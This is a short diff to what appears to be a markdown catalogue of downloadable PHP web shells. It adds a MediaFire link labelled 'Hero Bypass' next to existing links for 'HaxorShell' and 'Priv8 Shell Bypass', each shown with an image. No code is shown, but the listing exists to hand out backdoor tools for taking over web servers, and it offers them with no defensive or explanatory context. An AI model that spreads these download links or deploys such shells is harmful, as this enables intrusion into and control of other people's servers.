@@ -50,6 +50,9 @@ Date : 10 January 2023
   
 # <a href="https://www.mediafire.com/file/g0rd3xuid9dpppf/haxorshell_shell.php/file">HaxorShell</a>
 <img src="https://imgur.com/2TSMpD0.png" alt="beruangsalju profile">
+
+# <a href="https://www.mediafire.com/file/lb3ge10ehcq1o53/hero-bypass_shell.php/file">Hero Bypass</a>
+<img src="https://imgur.com/6xL6wEZ.png" alt="beruangsalju profile">
   
 # <a href="https://www.mediafire.com/file/ol95m5804ecudjx/devil-bypass_shell.php/file">Priv8 Shell Bypass</a>
 <img src="https://imgur.com/fJnl6o9.png" alt="beruangsalju profile">
